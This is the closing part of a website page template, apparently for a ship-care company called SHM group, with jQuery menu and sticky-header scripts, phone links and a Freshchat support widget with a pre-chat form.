                    $(".footer-menu li.active").addClass("open").children("ul").show(), $(".footer-menu li.has-sub>a").on("click", function() {
                        $(this).removeAttr("href");
                        var e = $(this).parent("li");
                        e.hasClass("open") ? (e.removeClass("open"), e.find("li").removeClass("open"), e.find("ul").slideUp()) : (e.addClass("open"), e.children("ul").slideDown(), e.siblings("li").children("ul").slideUp(), e.siblings("li").removeClass("open"), e.siblings("li").find("li").removeClass("open"), e.siblings("li").find("ul").slideUp())
                    });

                });

            </script>

                                <!--<script src="js/universal.js" ></script>-->

                            <!-- Lazy Load -->
                            <!--<script src="js/lazyload/jquery.js"></script>
<script src="//cdn.jsdelivr.net/jquery.lazyloadxt/1.0.0/jquery.lazyloadxt.min.js"></script>
<script src="js/lazyload/jquery.lazyloadxt.autoload.min.js"></script>-->


                                <div id="slideout" >
	<div id="clickme">
      <p><i class="fa fa-phone" aria-hidden="true"></i> <a href="tel:+912048553333"> +91 2048-55-3333</a></p>
	</div>
</div>


<div id="slideout_mob" >
	<div id="clickme_mob" style="position:left">
      <p><a href="tel:118001020464"><i class="fa fa-phone" aria-hidden="true"></i> </a></p>
	</div>
</div>

                                <!-- Chat Box -->

                                <!--<script type='text/javascript' async>
                                    var fc_CSS = document.createElement('link');
                                    fc_CSS.setAttribute('rel', 'stylesheet');
                                    var fc_isSecured = (window.location && window.location.protocol == 'https:');
                                    var fc_lang = document.getElementsByTagName('html')[0].getAttribute('lang');
                                    var fc_rtlLanguages = ['ar', 'he'];
                                    var fc_rtlSuffix = (fc_rtlLanguages.indexOf(fc_lang) >= 0) ? '-rtl' : '';
                                    fc_CSS.setAttribute('type', 'text/css');
                                    fc_CSS.setAttribute('href', ((fc_isSecured) ? 'https://d36mpcpuzc4ztk.cloudfront.net' : 'http://assets1.chat.freshdesk.com') + '/css/visitor' + fc_rtlSuffix + '.css');
                                    document.getElementsByTagName('head')[0].appendChild(fc_CSS);
                                    var fc_JS = document.createElement('script');
                                    fc_JS.type = 'text/javascript';
                                    fc_JS.defer = true;
                                    fc_JS.src = ((fc_isSecured) ? 'https://d36mpcpuzc4ztk.cloudfront.net' : 'http://assets.chat.freshdesk.com') + '/js/visitor.js';
                                    (document.body ? document.body : document.getElementsByTagName('head')[0]).appendChild(fc_JS);
                                    window.livechat_setting = 'eyJ3aWRnZXRfc2l0ZV91cmwiOiJzaG1ncm91cC5mcmVzaGRlc2suY29tIiwicHJvZHVjdF9pZCI6bnVsbCwibmFtZSI6IlNITSBTdXBwb3J0IFRlYW0iLCJ3aWRnZXRfZXh0ZXJuYWxfaWQiOm51bGwsIndpZGdldF9pZCI6IjFhMzA5MjY0LWEyMDItNGU2NC05NDhmLWM4Zjc3ZjUxOGNmMiIsInNob3dfb25fcG9ydGFsIjp0cnVlLCJwb3J0YWxfbG9naW5fcmVxdWlyZWQiOmZhbHNlLCJsYW5ndWFnZSI6ImVuIiwidGltZXpvbmUiOiJNdW1iYWkiLCJpZCI6MTcwMDAwMjMzMDQsIm1haW5fd2lkZ2V0IjoxLCJmY19pZCI6IjA4MjY3Y2YyMDMxZGJlYzRjOTAxZThmYzYyYzk0MWU3Iiwic2hvdyI6MSwicmVxdWlyZWQiOjIsImhlbHBkZXNrbmFtZSI6IlNITSBTaGlwY2FyZSIsIm5hbWVfbGFiZWwiOiJOYW1lIiwibWVzc2FnZV9sYWJlbCI6Ik1lc3NhZ2UiLCJwaG9uZV9sYWJlbCI6IlBob25lIiwidGV4dGZpZWxkX2xhYmVsIjoiVGV4dGZpZWxkIiwiZHJvcGRvd25fbGFiZWwiOiJEcm9wZG93biIsIndlYnVybCI6InNobWdyb3VwLmZyZXNoZGVzay5jb20iLCJub2RldXJsIjoiY2hhdC5mcmVzaGRlc2suY29tIiwiZGVidWciOjEsIm1lIjoiTWUiLCJleHBpcnkiOjAsImVudmlyb25tZW50IjoicHJvZHVjdGlvbiIsImVuZF9jaGF0X3RoYW5rX21zZyI6IlRoYW5rIHlvdSEhISIsImVuZF9jaGF0X2VuZF90aXRsZSI6IkVuZCIsImVuZF9jaGF0X2NhbmNlbF90aXRsZSI6IkNhbmNlbCIsInNpdGVfaWQiOiIwODI2N2NmMjAzMWRiZWM0YzkwMWU4ZmM2MmM5NDFlNyIsImFjdGl2ZSI6MSwicm91dGluZyI6eyJjaG9pY2VzIjp7Imxpc3QxIjpbIjAiXSwibGlzdDIiOlsiMCJdLCJsaXN0MyI6WyIwIl0sImRlZmF1bHQiOlsiMCJdfSwiZHJvcGRvd25fYmFzZWQiOiJmYWxzZSJ9LCJwcmVjaGF0X2Zvcm0iOjEsImJ1c2luZXNzX2NhbGVuZGFyIjpudWxsLCJwcm9hY3RpdmVfY2hhdCI6MSwicHJvYWN0aXZlX3RpbWUiOjMwLCJzaXRlX3VybCI6InNobWdyb3VwLmZyZXNoZGVzay5jb20iLCJleHRlcm5hbF9pZCI6bnVsbCwiZGVsZXRlZCI6MCwibW9iaWxlIjoxLCJhY2NvdW50X2lkIjpudWxsLCJjcmVhdGVkX2F0IjoiMjAxNi0wNy0zMFQyMjowMjozMy4wMDBaIiwidXBkYXRlZF9hdCI6IjIwMTYtMDgtMDZUMDc6MDg6MzUuMDAwWiIsImNiRGVmYXVsdE1lc3NhZ2VzIjp7ImNvYnJvd3Npbmdfc3RhcnRfbXNnIjoiWW91ciBzY3JlZW5zaGFyZSBzZXNzaW9uIGhhcyBzdGFydGVkIiwiY29icm93c2luZ19zdG9wX21zZyI6IllvdXIgc2NyZWVuc2hhcmluZyBzZXNzaW9uIGhhcyBlbmRlZCIsImNvYnJvd3NpbmdfZGVueV9tc2ciOiJZb3VyIHJlcXVlc3Qgd2FzIGRlY2xpbmVkIiwiY29icm93c2luZ19hZ2VudF9idXN5IjoiQWdlbnQgaXMgaW4gc2NyZWVuIHNoYXJlIHNlc3Npb24gd2l0aCBjdXN0b21lciIsImNvYnJvd3Npbmdfdmlld2luZ19zY3JlZW4iOiJZb3UgYXJlIHZpZXdpbmcgdGhlIHZpc2l0b3LigJlzIHNjcmVlbiIsImNvYnJvd3NpbmdfY29udHJvbGxpbmdfc2NyZWVuIjoiWW91IGhhdmUgYWNjZXNzIHRvIHZpc2l0b3LigJlzIHNjcmVlbi4iLCJjb2Jyb3dzaW5nX3JlcXVlc3RfY29udHJvbCI6IlJlcXVlc3QgdmlzaXRvciBmb3Igc2NyZWVuIGFjY2VzcyAiLCJjb2Jyb3dzaW5nX2dpdmVfdmlzaXRvcl9jb250cm9sIjoiR2l2ZSBhY2Nlc3MgYmFjayB0byB2aXNpdG9yICIsImNvYnJvd3Npbmdfc3RvcF9yZXF1ZXN0IjoiRW5kIHlvdXIgc2NyZWVuc2hhcmluZyBzZXNzaW9uICIsImNvYnJvd3NpbmdfcmVxdWVzdF9jb250cm9sX3JlamVjdGVkIjoiWW91ciByZXF1ZXN0IHdhcyBkZWNsaW5lZCAiLCJjb2Jyb3dzaW5nX2NhbmNlbF92aXNpdG9yX21zZyI6IlNjcmVlbnNoYXJpbmcgaXMgY3VycmVudGx5IHVuYXZhaWxhYmxlICIsImNvYnJvd3NpbmdfYWdlbnRfcmVxdWVzdF9jb250cm9sIjoiQWdlbnQgaXMgcmVxdWVzdGluZyBhY2Nlc3MgdG8geW91ciBzY3JlZW4gIiwiY2Jfdmlld2luZ19zY3JlZW5fdmkiOiJBZ2VudCBjYW4gdmlldyB5b3VyIHNjcmVlbiAiLCJjYl9jb250cm9sbGluZ19zY3JlZW5fdmkiOiJBZ2VudCBoYXMgYWNjZXNzIHRvIHlvdXIgc2NyZWVuICIsImNiX3ZpZXdfbW9kZV9zdWJ0ZXh0IjoiWW91ciBhY2Nlc3MgdG8gdGhlIHNjcmVlbiBoYXMgYmVlbiB3aXRoZHJhd24gIiwiY2JfZ2l2ZV9jb250cm9sX3ZpIjoiQWxsb3cgYWdlbnQgdG8gYWNjZXNzIHlvdXIgc2NyZWVuICIsImNiX3Zpc2l0b3Jfc2Vzc2lvbl9yZXF1ZXN0IjoiQWdlbnQgc2Vla3MgYWNjZXNzIHRvIHlvdXIgc2NyZWVuICJ9fQ==';

                                </script> -->
                                <script>  function initFreshChat() {    window.fcWidget.init({      token: "a47a514c-089a-47f2-929f-2b106f5462d1",      host: "https://wchat.freshchat.com"    });  }  function initialize(i,t){var e;i.getElementById(t)?initFreshChat():((e=i.createElement("script")).id=t,e.async=!0,e.src="https://wchat.freshchat.com/js/widget.js",e.onload=initFreshChat,i.head.appendChild(e))}function initiateCall(){initialize(document,"freshchat-js-sdk")}window.addEventListener?window.addEventListener("load",initiateCall,!1):window.attachEvent("load",initiateCall,!1);</script>

                                <!--<script>
  function initFreshChat() {
    window.fcWidget.init({
      token: "a47a514c-089a-47f2-929f-2b106f5462d1",
      host: "https://wchat.freshchat.com"
    });
  }
  function initialize(i,t){var e;i.getElementById(t)?initFreshChat():((e=i.createElement("script")).id=t,e.async=!0,e.src="https://wchat.freshchat.com/js/widget.js",e.onload=initFreshChat,i.head.appendChild(e))}function initiateCall(){initialize(document,"Freshchat-js-sdk")}window.addEventListener?window.addEventListener("load",initiateCall,!1):window.attachEvent("load",initiateCall,!1);
</script>-->








                                <script src="https://snippets.freshchat.com/js/fc-pre-chat-form-v2.js"></script>
                                <script>
                                    var preChatTemplate = {
                                        //Form header color and Submit button color.
                                        mainbgColor: '#ef4c23',
                                        //Form Header Text and Submit button text color.
                                        maintxColor: '#fff',
                                        //Chat Form Title
                                        heading: 'SHM group',
                                        //Chat form Welcome Message
                                        textBanner: 'We can\'t wait to talk to you. But first, please take a couple of moments to tell us a bit about yourself.',
                                        //Submit Button Label.
                                        SubmitLabel: 'Start Chat',
                                        //Fields List - Maximum is 5
                                        //All the values are mandatory and the script will not work if not available.
                                        fields: {

                                            field2: {
                                                //Type for Name - Do not Change
                                                type: "name",
                                                //Label for Field Name, can be in any language
                                                label: "Name",
                                                //Default - Field ID for Name - Do Not Change
                                                fieldId: "name",
                                                //Required "yes" or "no"
                                                required: "yes",
                                                //Error text to be displayed
                                                error: "Please Enter a valid name"
                                            },
                                            field3: {
                                                //Type for Email - Do Not Change
                                                type: "email",
                                                //Label for Field Email, can be in any language
                                                label: "Email",
                                                //Default - Field ID for Email - Do Not Change
                                                fieldId: "email",
                                                //Required "yes" or "no"
                                                required: "yes",
                                                //Error text to be displayed
                                                error: "Please Enter a valid Email"
                                            },
                                        }
                                    };
                                    window.fcSettings = {
                                        token: "a47a514c-089a-47f2-929f-2b106f5462d1",
                                        host: "https://wchat.freshchat.com",
                                        config: {
                                            cssNames: {
                                                //The below element is mandatory. Please add any custom class or leave the default.
                                                widget: 'custom_fc_frame',
                                                //The below element is mandatory. Please add any custom class or leave the default.
                                                expanded: 'custom_fc_expanded'
                                            }
                                        },
                                        onInit: function() {
                                            console.log('widget init');
                                            fcPreChatform.fcWidgetInit(preChatTemplate);
                                        }
                                    };

                                </script>
                                <script src="https://wchat.freshchat.com/js/widget.js" async></script>





                                <script defer type="text/javascript">
                                    /* Sticky Menu */
                                    $(document).ready(function() {
                                        var stickyNavTop = 50;
                                        var stickyNav = function() {
                                            var scrollTop = $(window).scrollTop();
                                            if (scrollTop > stickyNavTop) {
                                                $('.top-menu').addClass('sticky');
                                                $('.reapid-menu').addClass('sticky-sub')
                                            } else {
                                                if ($(".special-item-on-news-page").length == 0) {
                                                    $('.top-menu').removeClass('sticky');
                                                    $('.reapid-menu').removeClass('sticky-sub')
                                                }
                                            }
                                        };
                                        stickyNav();
                                        $(window).scroll(function() {
                                            stickyNav();
                                        });
                                    });

                                    /* Search Button */
                                    var scrolled = 0;
                                    $(document).ready(function() {


                                        $("#search-button-icon").on("click", function() {
                                            scrolled = 100;

                                            $('html, body').animate({
                                                scrollTop: scrolled
                                            });

                                        });

                                        $("#search-button-icon").click(function() {

                                            $("#___gcse_0").toggle();
                                            $(".search--bar").toggleClass("active-search--bar")
                                        })

                                        if ($(".special-item-on-news-page")) {
                                            $('.top-menu').addClass('sticky');
                                        }
                                    });

                                </script>






                                </body>

                                </html>
<?php } ?>
